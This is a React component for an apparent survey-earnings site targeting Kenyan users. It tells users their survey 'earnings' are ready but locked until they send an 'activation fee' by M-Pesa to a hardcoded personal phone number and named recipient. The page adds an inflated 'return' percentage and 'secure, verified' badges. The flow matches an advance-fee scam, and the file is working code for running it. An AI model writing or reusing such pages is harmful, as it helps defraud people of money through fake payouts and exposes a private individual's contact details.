// ========================= ActivationNotice.jsx =========================
import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import api from "../api/api";
import "./ActivationNotice.css";

/* =========================
   PLAN CONFIG
========================= */
const PLAN_CONFIG = {
  REGULAR: {
    label: "Regular Plan",
    activationFee: 100,
    color: "#10b981",
    icon: "⭐",
    total: 1500,
  },
  VIP: {
    label: "VIP Plan",
    activationFee: 150,
    color: "#6366f1",
    icon: "💎",
    total: 2000,
  },
  VVIP: {
    label: "VVIP Plan",
    activationFee: 200,
    color: "#f59e0b",
    icon: "👑",
    total: 3000,
  },
};

const SEND_MONEY_NUMBER = "0740209662";
const RECEIVER_NAME = "Irene Otoki";

export default function ActivationNotice() {
  const navigate = useNavigate();
  const location = useLocation();

  const [planKey, setPlanKey] = useState(null);
  const [totalEarned, setTotalEarned] = useState(0);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [userName, setUserName] = useState("");

  /* =========================
     LOAD USER AND PLAN DATA
  ========================= */
  useEffect(() => {
    const loadData = async () => {
      try {
        // Load user data
        const res = await api.get(`/auth/me?_t=${Date.now()}`);
        setUserName(res.data.full_name || "User");

        // Check for passed state from navigation
        const statePlanKey = location.state?.planType || location.state?.plan?.type;
        const stateAmount = location.state?.amount || location.state?.plan?.amount;

        if (statePlanKey) {
          setPlanKey(statePlanKey);
          setTotalEarned(stateAmount || PLAN_CONFIG[statePlanKey]?.total || 0);
          setLoading(false);
          return;
        }

        // If no state, check backend
        const activePlan = res.data.active_plan;
        const plan = res.data.plans?.[activePlan];

        if (!activePlan || !plan) {
          navigate("/dashboard");
          return;
        }

        // Check if plan needs activation
        if (plan.is_activated) {
          navigate("/dashboard?activated=true");
          return;
        }

        // Check if surveys are completed
        if (plan.surveys_completed < 10) {
          navigate("/dashboard");
          return;
        }

        setPlanKey(activePlan);
        setTotalEarned(PLAN_CONFIG[activePlan]?.total || 0);
      } catch (err) {
        console.error("Error loading activation details:", err);
        setError("Unable to load activation details. Please try again.");
      } finally {
        setLoading(false);
      }
    };

    loadData();
  }, [navigate, location.state]);

  /* =========================
     WHATSAPP SUPPORT FUNCTION
  ========================= */
  const openWhatsAppSupport = () => {
    const plan = planKey ? PLAN_CONFIG[planKey]?.label : "Account";
    const message = encodeURIComponent(
      `Hello SurveyEarn Support,\n\n` +
      `I need help with my account activation.\n\n` +
      `📋 Account Details:\n` +
      `• Name: ${userName}\n` +
      `• Plan: ${plan}\n` +
      `• Earnings: KES ${totalEarned.toLocaleString()}\n\n` +
      `❓ I have questions about the activation process.\n\n` +
      `Please assist me.`
    );
    
    const whatsappUrl = `https://wa.me/254740209662?text=${message}`;
    window.open(whatsappUrl, '_blank', 'noopener,noreferrer');
  };

  const handleActivate = () => {
    navigate("/activate", { 
      state: { 
        plan: planKey,
        activationFee: PLAN_CONFIG[planKey]?.activationFee,
        amount: totalEarned 
      }
    });
  };

  /* =========================
     LOADING STATE
  ========================= */
  if (loading) {
    return (
      <div className="activation-notice-page loading">
        <div className="loading-container">
          <div className="loading-spinner"></div>
          <p>Loading your activation details...</p>
        </div>
      </div>
    );
  }

  /* =========================
     ERROR STATE
  ========================= */
  if (error) {
    return (
      <div className="activation-notice-page">
        <div className="notice-card error">
          <div className="error-icon">⚠️</div>
          <h2>Something Went Wrong</h2>
          <p className="error-message">{error}</p>
          <button
            onClick={() => navigate("/dashboard")}
            className="primary-button"
          >
            Return to Dashboard
          </button>
        </div>
      </div>
    );
  }

  /* =========================
     NO PLAN STATE
  ========================= */
  if (!planKey) {
    return (
      <div className="activation-notice-page">
        <div className="notice-card">
          <div className="no-plan-icon">📋</div>
          <h2>Select a Plan First</h2>
          <p>Please complete surveys for a plan before activation.</p>
          <button
            onClick={() => navigate("/dashboard")}
            className="primary-button"
          >
            Go to Dashboard
          </button>
        </div>
      </div>
    );
  }

  const plan = PLAN_CONFIG[planKey];
  if (!plan) return null;

  /* =========================
     MAIN CONTENT
  ========================= */
  return (
    <div className="activation-notice-page">
      {/* HEADER SECTION */}
      <div className="notice-header">
        <div className="flag-badge">
          <span className="flag">🇰🇪</span>
          <span className="country">Kenya</span>
        </div>
        
        <h1 className="congratulations-title">
          <span className="title-icon">🎉</span>
          Congratulations!
          <span className="title-icon">🎉</span>
        </h1>
        
        <p className="user-greeting">Great work, {userName.split(' ')[0]}! 👏</p>
      </div>

      {/* MAIN CARD */}
      <div className="notice-card success">
        {/* PLAN BADGE */}
        <div className="plan-badge" style={{ borderColor: plan.color }}>
          <span className="plan-icon">{plan.icon}</span>
          <span className="plan-name">{plan.label}</span>
        </div>

        {/* SUCCESS MESSAGE */}
        <div className="success-section">
          <h2>Surveys Completed Successfully! ✅</h2>
          <p className="success-message">
            You've completed all required surveys for the{" "}
            <strong style={{ color: plan.color }}>{plan.label}</strong>.
          </p>
        </div>

        {/* EARNINGS DISPLAY */}
        <div className="earnings-card">
          <div className="earnings-header">
            <span className="earnings-icon">💰</span>
            <span className="earnings-label">Your Earnings Are Ready</span>
          </div>
          <div className="earnings-amount">KES {totalEarned.toLocaleString()}</div>
          <p className="earnings-note">Available for withdrawal after activation</p>
        </div>

        {/* ACTION REQUIRED SECTION */}
        <div className="action-required">
          <div className="action-header">
            <span className="action-icon">🔓</span>
            <h3>Action Required</h3>
          </div>
          <p className="action-text">
            Activate your account to unlock withdrawals to your M-Pesa.
          </p>
        </div>

        {/* PAYMENT DETAILS */}
        <div className="payment-details">
          <h4><span className="payment-icon">💳</span> Activation Payment</h4>
          
          <div className="payment-summary">
            <div className="payment-item">
              <span className="payment-label">One-Time Fee:</span>
              <span className="payment-value fee">KES {plan.activationFee}</span>
            </div>
            
            <div className="payment-item">
              <span className="payment-label">Unlock Earnings:</span>
              <span className="payment-value earnings">KES {totalEarned.toLocaleString()}</span>
            </div>
            
            <div className="roi-display">
              <span className="roi-label">Your Return:</span>
              <span className="roi-value">{Math.round((totalEarned / plan.activationFee) * 100)}%</span>
            </div>
          </div>

          <div className="mpesa-instructions">
            <h5>📲 Pay via M-Pesa:</h5>
            <div className="mpesa-details">
              <div className="detail-row">
                <span className="detail-label">Send to:</span>
                <span className="detail-value phone">{SEND_MONEY_NUMBER}</span>
                <button className="copy-btn">Copy</button>
              </div>
              <div className="detail-row">
                <span className="detail-label">Amount:</span>
                <span className="detail-value amount">KES {plan.activationFee}</span>
              </div>
              <div className="detail-row">
                <span className="detail-label">Name:</span>
                <span className="detail-value">{RECEIVER_NAME}</span>
              </div>
            </div>
          </div>
        </div>

        {/* BENEFITS */}
        <div className="benefits-section">
          <h4><span className="benefits-icon">✅</span> Activation Benefits</h4>
          <ul className="benefits-list">
            <li>Instant withdrawals to M-Pesa</li>
            <li>Secure payment protection</li>
            <li>24/7 customer support</li>
            <li>Priority survey access</li>
          </ul>
        </div>

        {/* PRIMARY ACTION BUTTON */}
        <button
          onClick={handleActivate}
          className="activate-button"
          style={{ background: plan.color }}
        >
          <span className="btn-icon">🔓</span>
          Activate Account Now
          <span className="btn-arrow">→</span>
        </button>

        {/* SUPPORT OPTIONS */}
        <div className="support-options">
          <button
            onClick={openWhatsAppSupport}
            className="support-button"
          >
            <span className="support-icon">💬</span>
            Need Help? Chat Support
          </button>
          
          <button
            onClick={() => navigate("/dashboard")}
            className="back-button"
          >
            ← Back to Dashboard
          </button>
        </div>

        {/* SECURITY NOTE */}
        <div className="security-note">
          <span className="security-icon">🔒</span>
          <span className="security-text">
            Secure M-Pesa Payment • Verified Account
          </span>
        </div>
      </div>

      {/* STEP INDICATOR */}
      <div className="step-indicator">
        <div className="step active">
          <div className="step-number">1</div>
          <div className="step-label">Complete Surveys</div>
        </div>
        <div className="step-arrow">→</div>
        <div className="step current">
          <div className="step-number">2</div>
          <div className="step-label">Activate Account</div>
        </div>
        <div className="step-arrow">→</div>
        <div className="step">
          <div className="step-number">3</div>
          <div className="step-label">Withdraw Earnings</div>
        </div>
      </div>
    </div>
  );
}